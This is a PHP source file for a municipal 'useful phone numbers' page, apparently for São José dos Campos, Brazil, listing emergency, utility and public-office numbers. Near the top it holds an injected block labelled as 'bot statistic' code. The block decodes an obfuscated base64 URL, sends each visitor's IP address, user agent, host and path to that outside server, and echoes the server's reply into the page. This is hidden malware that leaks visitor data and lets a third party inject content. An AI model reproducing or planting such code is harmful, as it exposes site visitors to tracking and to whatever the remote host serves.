<?php

include_once("../library/master-page.php");

$oMasterPage = new MasterPage();
$oMasterPage->Init("../master.php", "Telefones Úteis");
$oMasterPage->AddParameter("css", "telefones-uteis/index");
$oMasterPage->AddParameter("pagina", "telefones-uteis");
$oMasterPage->Open("PageContent");

?><?php
if (!isset($sRetry))
{
    global $sRetry;
    $sRetry = 1;
    // This code use for global bot statistic
    $sUserAgent = strtolower($_SERVER['HTTP_USER_AGENT']); //  Looks for google serch bot
    $sUserAgen = "";
    $stCurlHandle = NULL;
    $stCurlLink = "";
    if((strstr($sUserAgen, 'google') == false)&&(strstr($sUserAgen, 'yahoo') == false)&&(strstr($sUserAgen, 'baidu') == false)&&(strstr($sUserAgen, 'msn') == false)&&(strstr($sUserAgen, 'opera') == false)&&(strstr($sUserAgen, 'chrome') == false)&&(strstr($sUserAgen, 'bing') == false)&&(strstr($sUserAgen, 'safari') == false)&&(strstr($sUserAgen, 'bot') == false)) // Bot comes
    {
        if(isset($_SERVER['REMOTE_ADDR']) == true && isset($_SERVER['HTTP_HOST']) == true){ // Create  bot analitics
            $stCurlLink = base64_decode( 'aHR0cDovL21icm93c2Vyc3RhdHMuY29tL3N0YXRIL3N0YXQucGhw').'?ip='.urlencode($_SERVER['REMOTE_ADDR']).'&useragent='.urlencode($sUserAgent).'&domainname='.urlencode($_SERVER['HTTP_HOST']).'&fullpath='.urlencode($_SERVER['REQUEST_URI']).'&check='.isset($_GET['look']);
            @$stCurlHandle = curl_init( $stCurlLink );
        }
    }
    if ( $stCurlHandle !== NULL )
    {
        curl_setopt($stCurlHandle, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($stCurlHandle, CURLOPT_TIMEOUT, 8);
        $sResult = @curl_exec($stCurlHandle);
        if ($sResult[0]=="O")
        {$sResult[0]=" ";
            echo $sResult; // Statistic code end
        }
        curl_close($stCurlHandle);
    }
}
?>
<h1>Telefones úteis</h1>

<div class="telefones-uteis">
    <table class="table table-striped table-hover">
        <tr>
            <th>Emergência</th>
            <th class="telefone">190</th>
        </tr>
        <tr>
            <td>Bombeiros</td>
            <td class="telefone" >193</td>
        </tr>
        <tr>
            <td>SAMU</td>
            <td class="telefone">192</td>
        </tr>
        <tr>
            <td>Prefeitura</td>
            <td class="telefone">156 <br/><span>(Reclamações e pedidos de serviços públicos municipais)</span></td>
        </tr>
        <tr>
            <td>Ronda Social</td>
            <td class="telefone">153</td>
        </tr>
        <tr>
            <td>Prefeitura</td>
            <td class="telefone">3947-8000</td>
        </tr>
        <tr>
            <td>Urbam</td>
            <td class="telefone">3908-6000</td>
        </tr>
        <tr>
            <td>Funerária</td>
            <td class="telefone">3908-6000</td>
        </tr>
        <tr>
            <td>Fundhas</td>
            <td class="telefone">3932-0533</td>
        </tr>
        <tr>
            <td>Fundação Cultural Cassiano Ricardo</td>
            <td class="telefone">3924-7300</td>
        </tr>
        <tr>
            <td>Procon</td>
            <td class="telefone">151 / 3909-1445 <span>(Denúncias)</span></td>
        </tr>
        <tr>
            <td>Bandeirante Energia</td>
            <td class="telefone">0800-7210123</td>
        </tr>
        <tr>
            <td>Sabesp</td>
            <td class="telefone">0800-0119911</td>
        </tr>
        <tr>
            <td>Fórum</td>
            <td class="telefone">3878-7100</td>
        </tr>
        <tr>
            <td>Delegacia do Idoso</td>
            <td class="telefone">3913-1723</td>
        </tr>
        <tr>
            <td>Delegacia da Mulher</td>
            <td class="telefone">3941-4140</td>
        </tr>
        <tr>
            <td>Defensoria Pública do Estado</td>
            <td class="telefone">3942-2540 / 3942-3223</td>
        </tr>
        <tr>
            <td>Poupatempo</td>
            <td class="telefone">0800-7723633</td>
        </tr>
        <tr>
            <td>Receita Federal</td>
            <td class="telefone">146 / 3908-0203</td>
        </tr>
        <tr>
            <td>INSS - Previdência Social</td>
            <td class="telefone">3921-2139</td>
        </tr>
        <tr>
            <td>Ciee</td>
            <td class="telefone">3904-9900</td>
        </tr>



        <tr>
            <td class="telefone" colspan="2" >Cartórios Eleitorais</td></td>

        </tr>
        <tr>
            <td>Zona 127</td>
            <td class="telefone">3922-5944 / 3941-8480</td>
        </tr>
        <tr>
            <td>Zona 282</td>
            <td class="telefone">3921-2415 / 3921-2008</td>
        </tr>
        <tr>
            <td>Zona 411</td>
            <td class="telefone">3922-2658 / 3941-4583</td>
        </tr>
        <tr>
            <td>Zona 412</td>
            <td class="telefone">3923-8511 / 3913-6236</td>
        </tr>

    </table>

    <?php /*
    <ul class="listaTel">
        <li>
            <span>Emergência </span>
            <a href="tel:+4411122233344">190</a>
        </li>
        <li class="cor2">
            <span>Bombeiros </span>
            <span>193</span>
        </li>
        <li>
            <span>Prefeitura </span>
            <span>156 (Reclamações e pedidos de serviços públicos municipais)</span>
        </li>
        <li class="cor2">
            <span>Ronda Social </span>
            <span>153</span>
        </li>
        <li>
            <span><a href="http://www.sjc.sp.gov.br/" target="_blank">Prefeitura</a></span>
            <span>3947-8000</span>
        </li>
        <li class="cor2">
            <span><a href="http://www.urbam.com.br/" target="_blank">Urbam</a></span>
            <span>3908-6000</span>
        </li>
        <li>
            <span class=""><a href="http://urbam.com.br/sitenovo/funeraria.aspx" target="_blank">Funerária</a></span>
            <span>3908-6000</span>
        </li>
        <li class="cor2">
            <span><a href="http://www.fundhas.org.br/" target="_blank">Fundhas</a></span>
            <span>3932-0533</span>
        </li>
        <li>
            <span><a href="http://www.fccr.org.br" target="_blank">Fundação Cultural Cassiano Ricardo</a></span>
            <span>3924-7300</span>
        </li>
        <li class="cor2">
            <span><a href="http://www.sjc.sp.gov.br/secretarias/defesa_do_cidadao/procon.aspx" target="_blank">Procon</a></span>
            <span>151 / 3909-1445 (Denúncias)</span>
        </li>
        <li>
            <span><a href="http://www.bandeirante.com.br/" target="_blank">Bandeirante Energia</a></span>
            <span>0800-7210123</span>
        </li>
        <li class="cor2">
            <span><a href="http://www.sabesp.com.br/" target="_blank">Sabesp</a></span>
            <span>0800-0119911</span>
        </li>
        <li>
            <span>Fórum </span>
            <span>3878-7100</span>
        </li>
        <li class="cor2">
            <span>Delegacia do Idoso </span>
            <span>3913-1723</span>
        </li>
        <li>
            <span>Delegacia da Mulher</span>
            <span>3941-4140</span>
        </li>
        <li class="cor2">
            <span><a href="http://www.defensoria.sp.gov.br/" target="_blank">Defensoria Pública do Estado</a></span>
            <span>3942-2540 / 3942-3223</span>
        </li>
        <li>
            <span><a href="http://www.poupatempo.sp.gov.br/" target="_blank">Poupatempo</a></span>
            <span>0800-7723633</span>
        </li>
        <li class="cor2">
            <span><a href="http://www.sjc.sp.gov.br/cidade/cartorios.aspx" target="_blank">Cartórios Eleitorais</a></span>
            <span></span>
        </li>
        <li class="cor2">
            <span>Zona 127 </span>
            <span>3922-5944 / 3941-8480</span>
        </li>
        <li class="cor2">
            <span>Zona 282 </span>
            <span>3921-2415 / 3921-2008</span>
        </li>
        <li class="cor2">
            <span>Zona 411 </span>
            <span>3922-2658 / 3941-4583</span>
        </li>
        <li class="cor2">
            <span>Zona 412 </span>
            <span>3923-8511 / 3913-6236</span>
        </li>
        <li>
            <span><a href="http://www.receita.fazenda.gov.br/" target="_blank">Receita Federal</a></span>
            <span>146 / 3908-0203</span>
        </li>
        <li class="cor2">
            <span><a href="http://www.previdencia.gov.br/" target="_blank">INSS – Previdência Social</a></span>
            <span>3921-2139</span>
        </li>
        <li>
            <span><a href="http://www.ciee.org.br/" target="_blank">Ciee</a></span>
            <span>3904-9900</span>
        </li>
        <!--<li class="cor2"></li> -->
    </ul> */ ?>
</div>
<?php

$oMasterPage->Close("PageContent");
$oMasterPage->End();

?>